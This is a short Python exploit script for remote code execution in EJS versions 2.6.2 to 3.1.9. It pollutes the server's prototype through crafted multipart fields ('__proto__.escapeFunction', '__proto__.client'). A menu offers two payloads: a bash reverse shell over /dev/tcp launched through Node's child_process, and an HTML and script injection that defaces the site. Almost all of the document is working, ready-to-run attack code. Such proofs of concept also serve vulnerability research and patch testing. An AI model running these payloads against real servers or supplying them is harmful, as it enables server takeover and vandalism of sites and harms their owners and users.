import requests
url = 'http://localhost:8080/'

cmd = "(function() {process.mainModule.require('child_process').exec('bash -c \\'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1\\'')})()"

defaceSite = "escapeFn; var __output = \"<html><head><script>alert('Hey welcome to our defaced site')</script></head><body><h1>...xoxoxo</h1></body></html>\"; return __output"

howto = """
#############################################################
#### Remote code execution in EJS version 2.6.2 to 3.1.9 ####
#############################################################

### Please choose your attack
1) Reverse shell
2) Deface the website
"""

print(howto)
inputResponse = int(input("Enter your choice: "))
print("Starting Attack...")

if (inputResponse == 1):
    print("Sending Revshell payload... ")
    requests.post(url, files = {'__proto__.escapeFunction': (None, f"{cmd}")})
else:
    print("Sending DefaceWebSite payload... ")
    requests.post(url, files = {'__proto__.escapeFunction': (None, f"{defaceSite}")})
requests.post(url, files = {'__proto__.client': (None, f"x")})

# To enable async rendering
# requests.post(url, files = {'__proto__.async': (None, f"True")})

# To swith the switch on the debug mode on the server
# requests.post(url, files = {'__proto__.debug': (None, f"x")})

requests.get(url)
print("Done!")
